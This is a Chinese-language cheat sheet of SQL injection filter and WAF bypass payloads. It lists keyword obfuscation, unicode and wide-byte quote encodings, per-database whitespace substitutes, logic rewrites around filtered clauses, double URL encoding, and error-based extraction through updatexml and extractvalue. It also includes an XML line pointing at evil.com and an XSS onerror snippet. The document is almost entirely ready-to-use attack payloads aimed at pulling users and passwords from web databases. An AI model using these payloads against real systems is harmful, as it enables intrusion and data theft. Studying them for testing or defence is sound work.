### SQL注入绕过速查表



#### 过滤and or

```
or     ——>    ||
and     ——>    &&
xor	——>	|   
not	——>	!

十六进制绕过
or ——> o\x72

大小写绕过
Or
aNd

双写绕过
oorr
anandd

urlencode，ascii(char)，hex，unicode编码绕过
    一些unicode编码举例：
    单引号：'
    %u0027 %u02b9 %u02bc
    %u02c8 %u2032
    %uff07 %c0%27
    %c0%a7 %e0%80%a7
   
    
关键字内联注释尝试绕所有
/*!or*/
/*!and*/
```



#### 左括号过滤

    urlencode，ascii(char)，hex，unicode编码绕过
    %u0028 %uff08
    %c0%28 %c0%a8
    %e0%80%a8
    
#### 右括号过滤

```
urlencode，ascii(char)，hex，unicode编码绕过
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
```



#### 过滤union\select 

```
逻辑绕过
例：
过滤代码 union select user,password from users
绕过方式 1 && (select user from users where userid=1)='admin'

十六进制字符绕过
select ——> selec\x74
union——>unio\x6e

大小写绕过
SelEct

双写绕过
selselectect
uniunionon

urlencode，ascii(char)，hex，unicode编码绕过

关键字内联绕所有
/*!union*/
/*!select*/

```

#### 过滤空格

```
用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/()
绕过空格注释符绕过//--%20/**/#--+-- -;%00;

空白字符绕过SQLite3  ——     0A,0D,0c,09,20
MYSQL
	09,0A,0B,0B,0D,A0,20
PosgressSQL
	0A,0D,0C,09,20
Oracle_11g
	00,0A,0D,0C,09,20
MSSQL
	01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,OF,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
特殊符号绕过
	`  +  ！
等科学计数法绕过
	例：
	select user,password from users where user_id0e1union select 1,2
unicode编码
    %u0020 %uff00
    %c0%20 %c0%a0 %e0%80%a0

```

#### 过滤=

```
?id=1' or 1 like 1#可以绕过对 = > 等过滤
or '1' IN ('1234')#可以替代=


```

#### 过滤比较符<>

```


select*fromuserswhereid=1and ascii(substr(database(),0,1))>64

select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64


```



#### 过滤where

```
逻辑绕过
过滤代码 1 && (select user from users where user_id = 1) = 'admin'
绕过方式 1 && (select user from users limit 1) = 'admin'
```

#### 过滤limit

```
逻辑绕过
过滤代码 1 && (select user from users limit 1) = 'admin'
绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
```

#### 过滤group by

```
逻辑绕过
过滤代码 1 && (select user from users group by user_id having user_id = 1) = 'admin'
绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
```

#### 过滤select

```
逻辑绕过
过滤代码 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
绕过方式 1 && substr(user,1,1) = 'a'
```

#### 过滤’(单引号)

```
逻辑绕过
waf = 'and|or|union|where|limit|group by|select|\''
过滤代码 1 && substr(user,1,1) = 'a'
绕过方式 1 && user_id is not null1 && substr(user,1,1) = 0x611 && substr(user,1,1) = unhex(61)


宽字节绕过
%bf%27 %df%27 %aa%27

```

#### 过滤逗号

```
在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：
selectsubstr(database(0from1for1);selectmid(database(0from1for1);

对于limit可以使用offset来绕过：

select*fromnews limit0,1# 等价于下面这条SQL语句select*fromnews limit1offset0


```



#### 过滤hex

```
逻辑绕过
过滤代码 1 && substr(user,1,1) = unhex(61)
绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
```

#### 过滤substr

```
逻辑绕过

过滤代码 1 && substr(user,1,1) = lower(conv(11,10,16)) 
绕过方式 1 && lpad(user(),1,1) in 'r'
```



#### 编码绕过

利用urlencode，ascii(char)，hex，unicode等编码绕过

```
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。

十六进制编码
SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

双重编码绕过
?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

```

#### 等价函数或变量

```
hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　

或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```



#### 生僻函数

```
MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　

?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))

SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql

?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))

and extractvalue(1, concat(0x5c, (select user()),0x5c))
```



#### \N绕过

\N相当于NULL字符

```
select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
```



#### PCRE绕过

```
PHP 的 pcre.backtrack_limit 限制利用
union/*aaaaaaaxN*/select
```

上面的还不行？尝试修改语句逻辑再绕过试试？